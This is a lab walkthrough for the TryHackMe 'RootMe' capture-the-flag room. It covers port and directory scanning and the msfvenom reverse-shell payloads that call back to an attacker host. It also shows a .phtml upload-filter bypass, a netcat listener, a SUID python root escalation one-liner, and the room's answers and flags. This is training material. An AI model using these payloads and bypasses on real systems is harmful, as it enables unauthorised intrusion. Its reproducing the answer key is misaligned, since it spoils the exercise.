![RootMe Banner](https://assets.tryhackme.com/img/banners/default_tryhackme.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/rrootme/Rootme_Cover.png" alt="RootMe Logo">
</p>

# RootMe

This guide contains the answer and steps necessary to get to them for the [RootMe](https://tryhackme.com/room/rrootme) room.

## Table of contents

- [Reconnaissance](#reconnaissance)
- [Getting a shell](#getting-a-shell)
- [Privilege escalation](#privilege-escalation)

### Reconnaissance

1. Scan the machine, how many ports are open?

   We use `nmap` for this with:

   ```console
   nmap -sV -sS 10.10.77.33 -p-     
   ```

   RECON NMAP

   ><details><summary>Click for answer</summary>2</details>

2. What version of Apache is running?

   The Apache version can be seen from the scan. Otherwise add the `-sV` argument.

   ><details><summary>Click for answer</summary>2.4.29</details>

3. What service is running on port 22?

   This can also be found from the scan when using `-sV`.

   ><details><summary>Click for answer</summary>ssh</details>

4. Find directories on the web server using the GoBuster tool.

5. What is the hidden directory?

   Finding hidden directories, can be done with the following command:

   ```console
   gobuster dir -u 10.10.77.33:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
   ```

   RECON DIRECTORY

   One of these is not a standard folder for a webserver.

   ><details><summary>Click for answer</summary>/panel/</details>

### Getting a shell

1. user.txt

   The first to do is create a reverse shell payload. My first attempt was to use `msfvenom` to create a linux reverse tcp shell and output it as an `.elf` file.

   ```console
   msfvenom -p  linux/x64/meterpreter/reverse_tcp LHOST=10.10.82.70 LPORT=1337 -f elf -o letmein.elf
   ```

   SHELL PAYLOAD

   This can now be uploaded to the webserver.

   SHELL UPLOAD

   Unfortunately, I did not get a connection as the files was simply downloaded. We need to try a different format. Php is another usefull format for a reverse shell.

   ```console
   msfvenom -p php/reverse_php LHOST=10.10.82.70 LPORT=1337 -f raw > letmein.php
   ```

   SHELL PAYLOAD PHP

   SHELL UPLOAD PHP FAIL

   The server doesn't let us upload a `.php` file. This might be bypassed by renaming the file extension. Simply renaming to `.jpg.php` did not work in this case, but `.phtml` did.

   ```console
   mv letmein.php letmein.phtml 
   ```

   SHELL UPLOAD PHP RENAME

   SHELL UPLOAD PHP SUCCESS

   Now that it is uploaded we start our listener again and click on the file we uploaded in the `/uploads/` directory.

   ```console
   nc -nlvp 1337
   ```

   SHELL DIRECTORY

   Although the shell is connecting to our machine, it never seems to be fully established. So another method is in order. A pre-made php reverse shell can be obtained from 'pentestmonkey' on [github](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

   SHELL PHP SCRIPT

   We only need to add our own IP and port to listen on.

   SHELL PHP SCRIPT EDIT

   Save this file with the `phtml` extension en upload to the server. Setup the listener on port 1337 and execute the file from the `/uploads` page.

   SHELL CONNECTION

   Success!

   Now we can search for the file `user.txt` and open it to get our flag.

   ```console
   find / -name user.txt 2>/dev/null
   ```

   SHELL FLAG

   ><details><summary>Click for answer</summary>THM{y0u_g0t_a_sh3ll}</details>

### Privilege escalation

1. Search for files with SUID permission, which file is weird?

   Using: `find / -perm -4000 2>/dev/null` we can search for any binaries with their SUID bit set.

   PRIV SUID

   ><details><summary>Click for answer</summary>/usr/bin/python</details>

2. Find a form to escalate your privileges.

3. root.txt

   After we identify the outlier, we can go to the GTFO bins website to find out how we can abuse this specific binary.

   PRIV GTFO

   We need to add the path to the python binary on this machine to the command. Then we can simply run it in our shell.

   ```console
   /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
   ```

   PRIV ESCALATION

   We got root access!

   Now lets search for the root flag.

   ```console
   find /root -name root.txt 2>/dev/null
   ```

   PRIV ROOT FLAG

   ><details><summary>Click for answer</summary>THM{pr1v1l3g3_3sc4l4t10n}</details>